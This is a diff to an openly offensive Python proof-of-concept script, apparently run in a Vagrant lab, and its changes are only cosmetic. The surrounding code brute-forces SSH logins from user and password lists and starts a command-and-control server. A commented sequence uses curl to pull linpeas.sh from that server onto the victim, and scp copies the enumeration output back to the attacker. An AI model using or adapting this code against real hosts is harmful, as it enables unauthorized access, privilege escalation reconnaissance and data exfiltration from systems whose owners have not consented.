@@ -19,8 +19,8 @@ def processList(inp = "")->list:
 
 def getSshCredsAndConn(ulist="",plist="",domain="")->tuple[(str,str)]:
     """ Slow bruteforce of ssh credentials. """   
-    uname = processList(ulist) # "./init/userlist"
-    passwd = processList(plist) # "./init/passlist"
+    uname = processList(ulist) 
+    passwd = processList(plist)
     retUsr = "x"
     retPass= "x" 
     for user in uname:
@@ -57,7 +57,6 @@ def autoSshPawn(usr,password,host,sequence)-> int:
     return 0
 
 
-
 if __name__ == "__main__":
 
     flushProcesses()
@@ -75,11 +74,12 @@ if __name__ == "__main__":
     usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain=target)
 
     if usr and pwd:
-        print(f"Credentials user = {usr} | password={pwd}")
+        print(f"Credentials user = {usr} | password = {pwd}")
         proc, port = openCtrlSrv(bindaddr=attackAddr)
         srv = f"{attackAddr}:{port}"
         print(f"Command and Control server @{srv} !")
 
+        # Useful sequence : 
         # sequence = ["whoami",
         #             "pwd",
         #             "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
@@ -92,4 +92,5 @@ if __name__ == "__main__":
         proc = run(f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",shell=True)
 
         print(f"*** End of POC ***")
+        
         exit(0)
